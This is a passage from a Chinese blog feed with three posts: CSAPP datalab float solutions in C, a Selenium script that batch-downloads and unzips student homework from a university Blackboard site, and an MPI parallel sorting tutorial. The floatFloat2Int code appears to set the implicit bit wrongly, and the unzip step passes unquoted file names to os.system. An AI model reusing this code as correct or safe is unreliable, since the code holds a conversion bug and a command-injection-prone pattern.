id="floatFloat2Int">floatFloat2Int</h3><p>题目要求：返回 <code>(int)f</code> 等价的二进制整数</p><p>仍然考察了浮点数 IEEE 表示。需要考虑三种情况：</p><ul><li>denormalized，非常接近 0 的数，转换为 int 值后为0</li><li>normalized，数的分布从接近 0 到无穷，且越来越稀疏，当 f 不超过int型表示的范围时，转换为 int，当超过int 型表示的范围时返回 <code>0x8000 0000</code></li><li>special，返回 <code>0x8000 0000</code></li></ul><p>重点是，将 normalized float 转换为整数，F=1.frac ，M = F * 2^E</p><ul><li>如果E &gt;= 31，小数点右移31位，此时隐含的1和 frac 占32位，所以还需要一个符号位，超出了int范围</li><li>如果E &lt; 0，M = 0.1frac，转换为int后为0</li><li>如果0 &lt; E &lt; 23, 小数点右移E位后，需要舍弃 F 中部分位。直接将 F 左移 23-E 位，抹去小数部分</li><li>如果23 &lt;= E &lt; 31，将 F 左移 E-23 位，并在后面补零</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-type">int</span> sign = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>;<br><span class="hljs-type">int</span> e = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br><span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br><br><span class="hljs-type">int</span> exponent = e - <span class="hljs-number">127</span>;<br><span class="hljs-type">int</span> newFrac = <span class="hljs-number">0x1000000</span> + frac;<br><span class="hljs-type">int</span> shifted;<br><br><span class="hljs-keyword">if</span>(exponent &lt; <span class="hljs-number">0</span> || e == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(exponent &gt;= <span class="hljs-number">31</span> || e == <span class="hljs-number">0xFF</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>;<br><br><span class="hljs-keyword">if</span>(exponent &gt; <span class="hljs-number">24</span>)<br>shifted = newFrac &lt;&lt; (exponent - <span class="hljs-number">24</span>);<br><span class="hljs-keyword">else</span> <br>shifted = newFrac &gt;&gt; (<span class="hljs-number">24</span> - exponent);<br><br><span class="hljs-keyword">if</span>(sign)<br>shifted = -shifted;<br>  <span class="hljs-keyword">return</span> shifted;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2">floatPower2</h3><p>题目要求：返回 <code>2.0^x</code> 相等价的二进制表示整数。</p><p>根据 IEEE 浮点数表示，有几个边界需要注意</p><ol><li><code>x&gt;127</code> 太大，返回 NaN</li><li><code>x&lt;-148</code> 太小，返回0</li><li><code>x&gt;=-126</code> normalized float</li><li>其余情况为 denormalized float</li></ol><p>然后，就按照要求一步步填空，完成任务。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">127</span>)&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0xFF</span>&lt;&lt;<span class="hljs-number">23</span>; <span class="hljs-comment">// NaN</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">-148</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">-126</span>)&#123;<br>      <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = x + <span class="hljs-number">127</span>;<br>      <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-type">int</span> t = <span class="hljs-number">148</span> + x;<br>      <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; t);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验结果">实验结果</h2><p>如果所有函数都编写完成，编译运行后，出现如下结果，那么本实验就圆满完成了 :smile:。</p><p><img src="/img/CSAPP/lab1/3.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Bit Manipulation</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python 自动化——获取学生提交的作业</title>
    <link href="/2021/04/05/2021-4-5-selenium/"/>
    <url>/2021/04/05/2021-4-5-selenium/</url>
    
    <content type="html"><![CDATA[<h1>python 自动化——获取学生提交的作业</h1><p>我这学期担任本科的操作系统助教。课程要求所有学生的作业都提交到“网络教学平台上”给助教批改，但学生数量众多，一个一个点击下载压缩包十分麻烦，还容易遗漏。我注意到网站没有批量下载解压的功能，为提高工作效率，想试着使用python来一键完成下载解压。</p><h2 id="关于-selenium-webdriver">关于 selenium.webdriver</h2><p>Selenium 通过使用 <a href="https://www.selenium.dev/documentation/zh-cn/webdriver/"><em>webdriver</em></a> 支持市场上所有主流浏览器的自动化。 Webdriver 是一个 API 和协议，它支持多种语言，有python、java、C#、Ruby、JavaScript等。Webdriver 用于控制 web 浏览器的行为，且每个主流的浏览器都有一个特定的 WebDriver 实现，称为驱动程序。 驱动程序是负责委派给浏览器的组件，并处理与 Selenium 和浏览器之间的通信。</p><p>Selenium 框架通过一个面向用户的界面将所有这些部分连接在一起， 该界面支持不同的浏览器后端， 从而实现跨浏览器和跨平台自动化。</p><h3 id="安装">安装</h3><p>可以使用 <a href="https://docs.conda.io/en/latest/miniconda.html">miniconda</a> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda install -c conda-forge --name myenv selenium <br></code></pre></td></tr></table></figure><p>或者 pip ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install selenium<br></code></pre></td></tr></table></figure><p>然后，根据你使用的浏览器，安装<a href="https://www.selenium.dev/documentation/zh-cn/getting_started_with_webdriver/browsers/">特定于浏览器的 WebDriver 二进制文件</a>：</p><table><thead><tr><th style="text-align:left">浏览器</th><th style="text-align:left">维护者</th><th style="text-align:left">支持的版本</th></tr></thead><tbody><tr><td style="text-align:left">Chrome</td><td style="text-align:left"><a href="https://sites.google.com/a/chromium.org/chromedriver/">Chromium</a></td><td style="text-align:left">所有版本</td></tr><tr><td style="text-align:left">Firefox</td><td style="text-align:left"><a href="https://github.com/mozilla/geckodriver/">Mozilla</a></td><td style="text-align:left">54及以上版本</td></tr><tr><td style="text-align:left">Edge</td><td style="text-align:left"><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">Microsoft</a></td><td style="text-align:left">84及以上版本</td></tr><tr><td style="text-align:left">Internet Explorer</td><td style="text-align:left">Selenium</td><td style="text-align:left">6及以上版本</td></tr><tr><td style="text-align:left">Opera</td><td style="text-align:left"><a href="https://github.com/operasoftware/operachromiumdriver/">Opera Chromium</a> / <a href="https://github.com/operasoftware/operaprestodriver">Presto</a></td><td style="text-align:left">10.5及以上版本</td></tr><tr><td style="text-align:left">Safari</td><td style="text-align:left"><a href="https://webkit.org/blog/6900/webdriver-support-in-safari-10/">Apple</a></td><td style="text-align:left">10及以上版本</td></tr></tbody></table><p>在模拟用户在浏览器上的选择、点击等操作方面，<a href="https://www.selenium.dev/documentation/zh-cn/webdriver/">webdriver</a>包提供了非常多的便利！使用方面，网上有非常多详实的手册，如果你使用python，推荐 <a href="https://selenium-python-zh.readthedocs.io/en/latest/installation.html">selenium-Python</a> 网站。</p><h3 id="使用">使用</h3><p>不详细讨论技术细节，总的来说，有五个步骤：</p><ol><li>webdriver 初始化，获取驱动。Chrome 用 <code>webdriver.Chrome()</code></li><li>打开网页链接。<code>driver.get(&quot;http://www.python.org&quot;)</code></li><li>找到需要的元素。<code>elem = driver.find_element_by_name(&quot;q&quot;)</code></li><li>对该元素进行操作，例如点击、提交信息等。<code>elem.send_keys(&quot;pycon&quot;)</code></li><li>等待网页的响应。<code>driver.implicitly_wait(10)</code> 或者 <code>WebDriverWait(driver, 10).until()</code></li></ol><p>整个过程重点是要确定交互的元素，需要在编程前仔细研究网页的 HTML 源码。</p><h2 id="自动化">自动化</h2><h3 id="获取作业">获取作业</h3><p>首先，获取驱动，打开网站：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># bb 网站 点击 统一身份认证登录</span><br>driver = webdriver.Chrome(<span class="hljs-string">&quot;/Pathto/chromedriver&quot;</span>)<br>driver.get(<span class="hljs-string">&quot;https://www.bb.ustc.edu.cn/&quot;</span>)<br></code></pre></td></tr></table></figure><p>因为刚刚打开浏览器会比较慢，因此使用显式等待比较好。下面的代码，对应的操作就是点击“统一身份认证登录”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    button1 = WebDriverWait(driver, <span class="hljs-number">5</span>).until(<br>        EC.presence_of_element_located((By.LINK_TEXT, <span class="hljs-string">&quot;统一身份认证登录&quot;</span>)))<br>    button1.click()<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bb website Error&quot;</span>)<br>    driver.quit()<br></code></pre></td></tr></table></figure><center> <img src="/img/bb_ustc.png"></center><hr><p>随后就会进入科大的统一身份认证系统。同样地，先找到账号密码对应的 input 框的id，然后用 <code>find_element_by_id</code> 查找，将你的账号密码填入即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 中科大身份认证</span><br>driver.implicitly_wait(<span class="hljs-number">10</span>)<br>user = driver.find_element_by_id(<span class="hljs-string">&quot;username&quot;</span>)<br>user.clear()<br>user.send_keys(<span class="hljs-string">&quot;xxxxxx&quot;</span>)<br>password = driver.find_element_by_id(<span class="hljs-string">&quot;password&quot;</span>)<br>password.send_keys(<span class="hljs-string">&quot;xxxxxx&quot;</span>)<br>button2 = driver.find_element_by_id(<span class="hljs-string">&quot;login&quot;</span>)<br>button2.click()<br></code></pre></td></tr></table></figure><p>登录后，网站就跳入到了bb页面。要下载所有学生的作业，首先需要点击对应课程“操作系统原理与设计”，进入课程页面后，找到“评分中心”，下拉框中有“需要评分”一栏，点击后会出现已经提交作业的学生名单。</p><p>整体步骤依然不变，但为了更快找到对应元素，需要熟练地使用 webdriver 的 API 。不过我觉得，能用 id 或者 text 找，就尽量用 id 或 text 找。没有定义 id 和 text 的，才需要从 class 等入手。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 进入我的blackboard</span><br>driver.implicitly_wait(<span class="hljs-number">10</span>)<br>osbut = driver.find_element_by_partial_link_text(<span class="hljs-string">&quot;操作系统&quot;</span>)<br>osbut.click()<br><br><span class="hljs-comment"># 进入操作系统课程页面</span><br>driver.implicitly_wait(<span class="hljs-number">10</span>)<br>butlist = driver.find_elements_by_class_name(<span class="hljs-string">&quot;submenuLink&quot;</span>)<br>butlist[<span class="hljs-number">3</span>].click()<br>eval_score = driver.find_element_by_link_text(<span class="hljs-string">&quot;评分中心&quot;</span>)<br>eval_score.click()<br><br>driver.implicitly_wait(<span class="hljs-number">10</span>)<br>need_eval = driver.find_element_by_link_text(<span class="hljs-string">&quot;需要评分&quot;</span>)<br>need_eval.click()<br></code></pre></td></tr></table></figure><p>程序进行到这里后，我已经可以看到提交同学的名单了。但需要更进一步，让python能帮我自动下载这些作业，才是我的目的。</p><center>  <img src="/img/pingfen.jpg"></center><hr><p>先从该页面中，抠出所有提交作业的学生名。注意，<code>find_elements*</code> 的 API ，都是返回一个列表。以下面代码为例，返回了所有 class 为 <code>gradeAttempt</code> 的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 进入到评分界面 获取提交学生名单</span><br>driver.implicitly_wait(<span class="hljs-number">10</span>)<br>students = driver.find_elements_by_class_name(<span class="hljs-string">&quot;gradeAttempt&quot;</span>)<br>students_list = []<br><span class="hljs-keyword">for</span> button <span class="hljs-keyword">in</span> students:<br>    students_list.append(button.text)<br></code></pre></td></tr></table></figure><p>然后，点击链接（表格中同学名字的链接背后就是每个人的作业界面）。需要注意的是，下载完一个同学的作业后，还需要点击返回，即 <code>driver.back()</code>，才能回到上面的页面。循环才能继续，否则会出现程序找不到元素的情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> students_list:<br>    <span class="hljs-built_in">print</span>(text)<br>    button = driver.find_element_by_partial_link_text(text)<br>    button.click()<br><br>    <span class="hljs-comment"># 页面一直循环，直到 id=&quot;myDynamicElement&quot; 出现</span><br>    <span class="hljs-keyword">try</span>:<br>        download = WebDriverWait(driver, <span class="hljs-number">5</span>).until(<br>            EC.presence_of_element_located((By.CLASS_NAME, <span class="hljs-string">&quot;dwnldBtn&quot;</span>)))<br>        download.click()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(text, <span class="hljs-string">&quot;Get TimeoutException&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        driver.back()<br></code></pre></td></tr></table></figure><h3 id="解压操作">解压操作</h3><p>如此，我十分顺利地拿到了所有同学的作业，程序自动帮我下载到了 <code>~/下载</code> 目录中。不过，我还想一步到位，除了自动下载，干脆解压的工作也让程序帮我完成了吧 :smile:。下面的代码使用了 python 中最好用也是最常用的包 <a href="https://www.runoob.com/python/os-file-methods.html">os</a> 和 <a href="https://www.runoob.com/python/python-reg-expressions.html">re</a>。</p><p>一般来说，作业的提交格式都是统一的，这里是“学号_姓名.zip or .rar”，那么相关的正则表达式需要如何描述呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">os.chdir(<span class="hljs-string">&quot;~/下载&quot;</span>)<br><span class="hljs-comment"># 规定了 作业的提交格式 因此可以使用正则化表达</span><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;PB[0-9]&#123;8&#125;(.*)\.((zip)|(rar))&quot;</span>)<br>dirs = os.listdir()<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:<br>    <span class="hljs-keyword">if</span> pattern.<span class="hljs-keyword">match</span>(<span class="hljs-built_in">dir</span>) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># 给每位同学建立一个目录</span><br>        dst = <span class="hljs-string">&quot;/Path/to/HW/&quot;</span>+<span class="hljs-built_in">dir</span>[:-<span class="hljs-number">4</span>]<br>        os.makedirs(dst)<br>        <span class="hljs-comment"># 根据后缀名使用对应的解压工具</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">dir</span>[-<span class="hljs-number">3</span>:] == <span class="hljs-string">&quot;zip&quot;</span>:<br>            os.system(<span class="hljs-string">&quot;unzip -d &quot;</span>+dst+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">dir</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">dir</span>[-<span class="hljs-number">3</span>:] == <span class="hljs-string">&quot;rar&quot;</span>:<br>            os.system(<span class="hljs-string">&quot;unrar x &quot;</span>+<span class="hljs-built_in">dir</span>+<span class="hljs-string">&quot; &quot;</span>+dst)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>, <span class="hljs-string">&quot;is in HW/&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Deleting &quot;</span>, <span class="hljs-built_in">dir</span>)<br>        os.remove(<span class="hljs-built_in">dir</span>)<br></code></pre></td></tr></table></figure><p>大功告成！:happy:</p>]]></content>
    
    
    <categories>
      
      <category>Miscellaneous</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Webdriver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>并行正则采样排序之 MPI 实现</title>
    <link href="/2021/01/23/2021-1-23-psrs_sort/"/>
    <url>/2021/01/23/2021-1-23-psrs_sort/</url>
    
    <content type="html"><![CDATA[<h1>并行正则采样排序之 MPI 实现</h1><h2 id="算法介绍与原理">算法介绍与原理</h2><p>在并行计算中，流行一种比快速排序更高效的算法——并行正则采样排序算法。<strong>并行正则采样排序 PSRS</strong>（Parallel Sorting by Regular Sampling），是一种基于<strong>均匀划分</strong>（Uniform Partition）原理的负载均衡的并行排序算法。假定待排序的元素有 n 个，系统中有 p 个处理器，算法将</p><ol><li>将 n 个元素均匀地分割成 p 段，每段含有 n/p 个元素</li><li>给每段元素指派一个处理器，每个处理器对各自管辖的这部分元素进行<strong>快速排序</strong></li><li>从各段元素中抽取几个代表元素，再从它们产生出 p-1 个主元</li><li>找出这些主元与原来的各局部有序的元素之间的偏序关系，进而将各个局部有序段重新划分成 p 段</li><li>通过全局交换将各个段中的对应部分集合到一起，最后将集合到一起的元素采用<strong>多路归并</strong>方法进行排序</li></ol><p>不得不说，整个算法步骤较多，过程复杂，令人一时难以理解，博主通过图片的形式再描述一遍算法，希望能帮助各位。</p><center>   <img src="/img/PP/psrs.png"/></center><h2 id="具体实现">具体实现</h2><p>首先，还是老规矩，先生成随机数组，然后使用单个处理器（这里使用 <code>Proc#0</code>）排序，得到最终答案，用于检验并行程序的正确性。在做好这些初始化工作后，并行正则采样排序的实现正式开始！:muscle:</p><h3 id="分段快排">分段快排</h3><p>由 <code>Proc#0</code> 将所有数据分段发送给所有的处理器，每个处理器均匀地接收到部分数据，并调用 <code>qsort()</code> 函数进行快排。然而，均匀地分派给各处理器，就不得不考虑<strong>均分后的余数问题</strong>。当然，我们可以用 <code>MPI_Send</code> 和 <code>MPI_Recv</code>  函数，外加一个循环，来实现数据分派。但这样做 1）编程复杂，容易出错。2）不易阅读，难以理解。这里我采用了一个比较厉害的函数：<a href="https://www.mpich.org/static/docs/v3.2/www3/MPI_Scatterv.html">MPI_Scatterv</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MPI_Scatterv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *sendbuf, <span class="hljs-type">const</span> <span class="hljs-type">int</span> *sendcounts, <span class="hljs-type">const</span> <span class="hljs-type">int</span> *displs,</span><br><span class="hljs-params">                 MPI_Datatype sendtype, <span class="hljs-type">void</span> *recvbuf, <span class="hljs-type">int</span> recvcount,</span><br><span class="hljs-params">                 MPI_Datatype recvtype,</span><br><span class="hljs-params">                 <span class="hljs-type">int</span> root, MPI_Comm comm)</span><br></code></pre></td></tr></table></figure><p>总的来说，就是将一个处理器中包含的内容，全都<strong>散播</strong>到各个处理器中。当然，具体到每个处理器应该获得多长的数据，以及获得哪部分的数据，就分别由 <code>sendcounts</code> 和 <code>displs</code> 这两个数组决定了。</p><p>回到本问题，我将除法计算中得到的余数，全部扔给了最后一个处理器，那么 <code>sendcounts</code> 的最后一个元素长度就需要加上余数，其余不变。于是便有如下实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 分段数据 移交各个处理器  group = 数组长度n / 处理器数p</span><br><span class="hljs-type">int</span> sendcounts[num_procs];<br><span class="hljs-type">int</span> displs[num_procs];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num_procs; i++) &#123;<br>    sendcounts[i] = group;<br>    displs[i] = i*group;<br>&#125;<br>sendcounts[num_procs<span class="hljs-number">-1</span>] = group+mod;<br>MPI_Scatterv(<span class="hljs-built_in">array</span>, sendcounts, displs, MPI_INT, a, group+mod, MPI_INT, <span class="hljs-number">0</span>, MPI_COMM_WORLD);<br><br>group_len = sendcounts[id_procs];<br><span class="hljs-comment">// 均匀划分 局部排序</span><br>qsort(a, group_len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>), compare);<br></code></pre></td></tr></table></figure><h3 id="抽取代表">抽取代表</h3><p>让每个处理器从已经排好序的数据中，抽取出第$ w, 2w, 3w, … (p-1)w <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>个代表元素，其中</mtext></mrow><annotation encoding="application/x-tex">个代表元素，其中</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">个代表元素，其中</span></span></span></span> w = n/p^2 $。每个处理器抽取好 p-1 个数据后，全部送到 <code>Proc#0</code> 处理器中，由它来完成对代表元素的排序。</p><p>很有意思哈，第一步要求 <code>Proc#0</code> 把数据发送给各个处理器，而第二步是要求 <code>Proc#0</code> 接收来自各处理器的数据。</p><center>    <img src="/img/PP/Scatter&Gather.png"/></center><p>简单介绍一下，<code>MPI_Scatterv</code>  的反操作 <a href="https://www.mpich.org/static/docs/v3.2/www3/MPI_Gatherv.html">MPI_Gatherv</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MPI_Gatherv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *sendbuf, <span class="hljs-type">int</span> sendcount, MPI_Datatype sendtype,</span><br><span class="hljs-params">                <span class="hljs-type">void</span> *recvbuf, <span class="hljs-type">const</span> <span class="hljs-type">int</span> *recvcounts, <span class="hljs-type">const</span> <span class="hljs-type">int</span> *displs,</span><br><span class="hljs-params">                MPI_Datatype recvtype, <span class="hljs-type">int</span> root, MPI_Comm comm)</span><br></code></pre></td></tr></table></figure><p>其中的参数要求与 <code>MPI_Scatter</code> 相似，毕竟是镜像操作。</p><p>有了之前的编程经验，相信收集数据的编程就不难了，不过还是要注意一下，偏移量和长度等细节问题。细心的读者可能发现了，这边接收数据的长度都为常值，因此可以使用一个更简单的函数 <a href="https://www.mpich.org/static/docs/v3.2/www3/MPI_Gather.html">MPI_Gather</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 正则采样</span><br><span class="hljs-type">int</span> recvcounts[num_procs];<br><span class="hljs-type">int</span> samples[num_procs * num_procs];<br><span class="hljs-type">int</span> s[num_procs];    <br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; num_procs; i++)<br>    s[i<span class="hljs-number">-1</span>] = a[i * group / num_procs];<br><span class="hljs-comment">// 采到样本 收集到Proc#0</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; num_procs; i++) &#123;<br>    recvcounts[i] = num_procs<span class="hljs-number">-1</span>;<br>    displs[i] = i * (num_procs<span class="hljs-number">-1</span>);<br>&#125;<br>MPI_Gatherv(s, num_procs<span class="hljs-number">-1</span>, MPI_INT, samples, recvcounts, displs, MPI_INT, <span class="hljs-number">0</span>, MPI_COMM_WORLD);<br><br><span class="hljs-comment">// 采样排序</span><br><span class="hljs-keyword">if</span> (id_procs == <span class="hljs-number">0</span>)<br>    qsort(samples, (num_procs<span class="hljs-number">-1</span>)*num_procs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>), compare);<br></code></pre></td></tr></table></figure><h3 id="主元划分">主元划分</h3><p>上小节中，<code>Proc#0</code> 处理器对代表元素完成排序后，需要从中抽取第$ p-1,2(p-1),…,(p-1)(p-1) $ 个主元，并将它们全部广播到所有处理器中。然后，每个处理器根据这 p-1 个主元，将自己的数据划分为 p 段。</p><p>将有序数组划分为 p 段，还是很简单的吧 :laughing:。只需要遍历一下有序数组，就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 进行主元划分</span><br>index = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pcounts[num_procs];<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; num_procs; i++)<br>    pcounts[i] = <span class="hljs-number">0</span>;<br>pivot[num_procs<span class="hljs-number">-1</span>] = INT32_MAX;<br><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; group_len; i++) &#123;<br>    <span class="hljs-keyword">if</span>(a[i] &lt;= pivot[index])<br>        pcounts[index]++;<br>    <span class="hljs-keyword">else</span> &#123;<br>        i--;<br>        index++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="全局交换">全局交换</h3><p>上小节中，每个处理器都将自己的数据划分为 p 段。为表述方便，记$ W^j_i $ 为 <code>Proc#i</code> 中的第 j 段。将所有处理器的$ W^j $ 都发送给 <code>Proc#j</code> 处理器，然后每个处理器再对接收到的数据使用<strong>归并排序</strong>。完成任务后，将所有有序数据发回给 <code>Proc#0</code> ，让它完成答案校验。</p><p>让我们再补充一个 MPI 的函数 <a href="https://www.mpich.org/static/docs/v3.2/www3/MPI_Alltoallv.html">MPI_Alltoallv</a> :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MPI_Alltoallv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *sendbuf, <span class="hljs-type">const</span> <span class="hljs-type">int</span> *sendcounts,</span><br><span class="hljs-params">                  <span class="hljs-type">const</span> <span class="hljs-type">int</span> *sdispls, MPI_Datatype sendtype, <span 